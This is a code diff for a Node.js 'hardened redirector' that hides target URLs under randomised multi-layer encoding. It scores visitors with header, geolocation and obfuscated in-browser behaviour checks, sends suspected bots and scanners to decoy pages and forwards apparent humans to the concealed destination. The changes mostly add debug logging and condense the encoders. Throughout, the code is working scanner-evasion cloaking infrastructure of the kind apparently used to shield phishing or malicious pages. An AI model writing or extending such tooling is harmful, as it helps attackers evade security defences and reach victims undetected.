@@ -72,6 +72,8 @@ function isLikelyBot(req) {
   if (!h['accept-language'] || h['accept-language'].length < 5) score += 20;
   if (Object.keys(h).length < 11) score += 25;
 
+  console.log(`[DEBUG] Bot score: ${score} | UA: ${ua.substring(0,80)}... | Mobile: ${isMobile(req)}`);
+
   return score >= 75;
 }
 
@@ -80,7 +82,10 @@ async function getCountryCode(req) {
   if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) return 'XX';
 
   let cc = geoCache.get(ip);
-  if (cc) return cc;
+  if (cc) {
+    console.log(`[DEBUG] Geo cache hit: ${ip} → ${cc}`);
+    return cc;
+  }
 
   try {
     const token = process.env.IPINFO_TOKEN;
@@ -96,84 +101,57 @@ async function getCountryCode(req) {
       cc = data.country?.toUpperCase();
       if (/^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
+        console.log(`[DEBUG] Geo fetched: ${ip} → ${cc}`);
         return cc;
       }
     }
-  } catch {}
+  } catch (err) {
+    console.log(`[ERROR] Geo fetch failed for ${ip}: ${err.message}`);
+  }
 
   return 'XX';
 }
 
-// ─── Encoders (RC4 fixed) ────────────────────────────────────────────────────
+// ─── Encoders ────────────────────────────────────────────────────────────────
 const encoders = [
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
   { name: 'hex',       enc: s => Buffer.from(s).toString('hex'),       dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'rot13', 
-    enc: s => s.replace(/[a-zA-Z]/g, c => {
-      const b = c <= 'Z' ? 65 : 97;
-      return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
-    }), 
-    dec: s => s.replace(/[a-zA-Z]/g, c => {
-      const b = c <= 'Z' ? 65 : 97;
-      return String.fromCharCode(((c.charCodeAt(0) - b - 13 + 26) % 26) + b);
-    })
-  },
+  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) },
   { name: 'xor', needsKey: true,
     enc: (s, key) => Buffer.from(s.split('').map((c,i) => c.charCodeAt(0) ^ Buffer.from(key, 'hex')[i % key.length])).toString('base64url'),
-    dec: (s, key) => {
-      const k = Buffer.from(key, 'hex');
-      const buf = Buffer.from(s, 'base64url');
-      return buf.map((b,i) => String.fromCharCode(b ^ k[i % k.length])).join('');
-    }
+    dec: (s, key) => Buffer.from(s, 'base64url').map((b,i) => String.fromCharCode(b ^ Buffer.from(key, 'hex')[i % key.length])).join('')
   },
-  { name: 'rc4', needsKey: true, // FIXED KSA + PRGA
+  { name: 'rc4', needsKey: true,
     enc: (s, key) => {
       const k = Buffer.from(key, 'hex');
-      let state = Array.from({length:256}, (_,i)=>i);
-      let j = 0;
-      for (let i = 0; i < 256; i++) {
-        j = (j + state[i] + k[i % k.length]) % 256;
-        [state[i], state[j]] = [state[j], state[i]];
-      }
-      let out = '';
-      let i = 0; j = 0;
+      let state = Array.from({length:256}, (_,i)=>i), j=0;
+      for (let i=0; i<256; i++) { j=(j+state[i]+k[i%k.length])%256; [state[i],state[j]]=[state[j],state[i]]; }
+      let out='', i=0; j=0;
       for (let byte of Buffer.from(s)) {
-        i = (i + 1) % 256;
-        j = (j + state[i]) % 256;
-        [state[i], state[j]] = [state[j], state[i]];
-        out += String.fromCharCode(byte ^ state[(state[i] + state[j]) % 256]);
+        i=(i+1)%256; j=(j+state[i])%256; [state[i],state[j]]=[state[j],state[i]];
+        out += String.fromCharCode(byte ^ state[(state[i]+state[j])%256]);
       }
       return Buffer.from(out).toString('base64url');
     },
-    dec: (s, key) => encoders.find(e=>e.name==='rc4').enc(Buffer.from(s,'base64url').toString(), key) // symmetric
+    dec: (s, key) => encoders.find(e=>e.name==='rc4').enc(Buffer.from(s,'base64url').toString(), key)
   },
   { name: 'unicode-stego',
-    enc: s => {
-      let out = '';
-      for (let byte of Buffer.from(s)) {
-        out += String.fromCodePoint(0xFE00 + (byte >> 4));
-        out += String.fromCodePoint(0xE000 + (byte & 0x0F));
-      }
-      return out;
-    },
+    enc: s => Buffer.from(s).reduce((out,byte) => out + String.fromCodePoint(0xFE00+(byte>>4)) + String.fromCodePoint(0xE000+(byte&0xF)), ''),
     dec: s => {
       let bytes = [];
-      for (let i = 0; i < s.length - 1; i += 2) {
-        const hi = s.codePointAt(i) - 0xFE00;
-        const lo = s.codePointAt(i+1) - 0xE000;
-        if (hi >= 0 && hi <= 15 && lo >= 0 && lo <= 15) {
-          bytes.push((hi << 4) | lo);
-        }
+      for (let i=0; i<s.length-1; i+=2) {
+        const hi = s.codePointAt(i)-0xFE00, lo = s.codePointAt(i+1)-0xE000;
+        if (hi>=0&&hi<=15 && lo>=0&&lo<=15) bytes.push((hi<<4)|lo);
       }
       return Buffer.from(bytes).toString('utf8');
     }
   }
 ];
 
-// ─── Encoding / Decoding ─────────────────────────────────────────────────────
+// ─── Encode / Decode ─────────────────────────────────────────────────────────
 function multiLayerEncode(str) {
   let result = str;
-  const noiseLen = 5 + Math.floor(Math.random() * 11);
+  const noiseLen = 5 + Math.floor(Math.random()*11);
   const noise = crypto.randomBytes(noiseLen).toString('hex');
   result = noise + result + noise;
 
@@ -181,36 +159,40 @@ function multiLayerEncode(str) {
   const hmac = crypto.createHmac('sha256', integrityKey).update(result).digest('base64url');
   result += `|${hmac}|${integrityKey}`;
 
-  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
-  const selected = shuffled.slice(0, 5 + Math.floor(Math.random() * 4));
+  const shuffled = [...encoders].sort(() => Math.random()-0.5);
+  const selected = shuffled.slice(0, 5 + Math.floor(Math.random()*4));
 
   const layerHistory = [];
   for (const layer of selected) {
-    let key = layer.needsKey ? crypto.randomBytes(8 + Math.floor(Math.random() * 9)).toString('hex') : null;
+    let key = layer.needsKey ? crypto.randomBytes(8 + Math.floor(Math.random()*9)).toString('hex') : null;
     result = key ? layer.enc(result, key) : layer.enc(result);
     layerHistory.push({ name: layer.name, key });
   }
 
   result = Buffer.from(result).toString('base64url');
+  console.log(`[DEBUG] Encoded payload length: ${result.length} | Layers: ${layerHistory.map(l=>l.name).join(',')}`);
 
   return { encoded: result, layers: layerHistory.reverse() };
 }
 
 function multiLayerDecode(encoded, layers) {
   let result;
-  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { return null; }
+  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { console.log('[ERROR] Base64url decode failed'); return null; }
 
   const parts = result.split('|');
   if (parts.length >= 3) {
     const payload = parts[0], received = parts[1], key = parts[2];
-    if (crypto.createHmac('sha256', key).update(payload).digest('base64url') !== received) return null;
+    if (crypto.createHmac('sha256', key).update(payload).digest('base64url') !== received) {
+      console.log('[ERROR] HMAC integrity check failed');
+      return null;
+    }
     result = payload;
   }
 
   for (const { name, key } of layers) {
     const layer = encoders.find(e => e.name === name);
     if (!layer) continue;
-    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { return null; }
+    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { console.log(`[ERROR] Layer decode failed: ${name}`); return null; }
   }
 
   const noiseGuess = Math.floor(result.length * 0.07);
@@ -228,9 +210,12 @@ app.get('/g', (req, res) => {
   const layersB64 = Buffer.from(JSON.stringify(layers)).toString('base64url');
 
   const id = crypto.randomBytes(10).toString('hex');
-  linkCache.set(id, { e: encoded, l: layersB64 });
+  linkCache.set(id, { e: encoded, l: layersB64, target });
 
-  res.json({ success: true, url: `https://${req.hostname}/v/${id}` });
+  const url = `https://${req.hostname}/v/${id}`;
+  console.log(`[EVENT] Generated link: ${url} → ${target.substring(0,60)}...`);
+
+  res.json({ success: true, url });
 });
 
 // ─── Verification gate ───────────────────────────────────────────────────────
@@ -239,15 +224,22 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const country = await getCountryCode(req);
   const ua = req.headers['user-agent'] || '';
 
+  console.log(`[EVENT] Access /v/${req.params.id} | IP: ${ip} | Country: ${country} | UA: ${ua.substring(0,80)}...`);
+
   if (isLikelyBot(req)) {
     fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`, ()=>{});
-    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+    const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
+    console.log(`[EVENT] Bot blocked → ${safe}`);
+    return res.redirect(safe);
   }
 
   fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`, ()=>{});
 
   const data = linkCache.get(req.params.id);
-  if (!data) return res.redirect(BOT_URLS[0]);
+  if (!data) {
+    console.log(`[ERROR] Link not found or expired: ${req.params.id}`);
+    return res.redirect(BOT_URLS[0]);
+  }
 
   const hpSuffix = crypto.randomBytes(5).toString('hex');
 
@@ -294,6 +286,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
         (mob && comp===0 && hasO && !hasCV) ||
         (mob && hasM && !touch);
 
+      console.log(\`[CLIENT-CHECK] mob:\${mob} ent:\${ent.toFixed(1)} mov:\${moves} tilt:\${tiltE.toFixed(1)} comp:\${compE.toFixed(1)} mot:\${mot} hp:\${hpFilled()?'FILLED':'clean'} → \${sus?'BOT':'PASS'}\`);
       location = sus ? B : T;
     },950+Math.random()*1050);
   })();
@@ -335,19 +328,11 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     <p>Verifying request… please wait</p>
   </div>
 
-  <!-- Randomized honeypot field names -->
   <div class="visually-hidden">
-    <label for="hp_n_${hpSuffix}">Name (leave empty)</label>
-    <input type="text" id="hp_n_${hpSuffix}" name="n" autocomplete="off" tabindex="-1">
-
-    <label for="hp_e_${hpSuffix}">Email (do not fill)</label>
-    <input type="email" id="hp_e_${hpSuffix}" name="e" autocomplete="off" tabindex="-1">
-
-    <label for="hp_w_${hpSuffix}">Website (ignore)</label>
-    <input type="url" id="hp_w_${hpSuffix}" name="w" autocomplete="off" tabindex="-1">
-
-    <label for="hp_c_${hpSuffix}">Agree (do not check)</label>
-    <input type="checkbox" id="hp_c_${hpSuffix}" name="c" tabindex="-1">
+    <input type="text" id="hp_n_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="email" id="hp_e_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="url" id="hp_w_${hpSuffix}" autocomplete="off" tabindex="-1">
+    <input type="checkbox" id="hp_c_${hpSuffix}" tabindex="-1">
   </div>
 
   <script nonce="${res.locals.nonce}">${obfJS}</script>
@@ -358,5 +343,5 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 app.use((_, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Hardened redirector listening on ${PORT}`);
-})
+  console.log(`[STARTUP] Hardened redirector listening on ${PORT}`);
+});
